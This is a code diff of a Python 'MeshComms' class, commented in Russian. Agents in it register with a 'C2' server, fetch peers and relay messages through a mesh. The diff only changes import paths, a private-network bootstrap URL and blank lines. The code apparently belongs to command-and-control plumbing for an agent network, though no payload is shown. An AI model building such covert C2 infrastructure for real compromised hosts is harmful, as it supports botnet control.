@@ -1,7 +1,7 @@
 import asyncio
 from shared.messages import Message
-from agents.crypto import encrypt, decrypt
-from agents.comms.discovery import register_with_c2, get_known_peers
+from crypto import encrypt, decrypt
+from comms.discovery import register_with_c2, get_known_peers
 import socket
 
 class MeshComms:
@@ -11,21 +11,18 @@ class MeshComms:
         self.known_peers = {}  # agent_id -> (ip, port)
         self.message_handler = None
         self.processed_msgs = set()
-        self.bootstrap_url = bootstrap_url or "http://192.168.1.74:8000/api"
+        self.bootstrap_url = bootstrap_url or "http://192.168.1.67:8000/api"
 
     async def start(self):
         # Получить внешний IP
         ip = self._get_local_ip()
-        
         # Зарегистрироваться на C2
         register_with_c2(self.agent_id, ip, self.listen_port)
-        
         # Получить известных пиров
         peers = get_known_peers()
         for peer in peers:
             if peer["id"] != self.agent_id:
                 self.add_peer(peer["id"], peer["ip"], peer["port"])
-        
         # Запустить сервер
         await self.start_server()
 
@@ -68,7 +65,6 @@ class MeshComms:
         if next_hop not in self.known_peers:
             print(f"[{self.agent_id}] Неизвестный peer: {next_hop}")
             return
-
         ip, port = self.known_peers[next_hop]
         await self.send_message(ip, port, msg)
 
@@ -98,7 +94,6 @@ class MeshComms:
         if next_hop not in self.known_peers:
             print(f"[{self.agent_id}] send_along_route: peer {next_hop} не найден")
             return
-
         ip, port = self.known_peers[next_hop]
         await self.send_message(ip, port, msg)
 
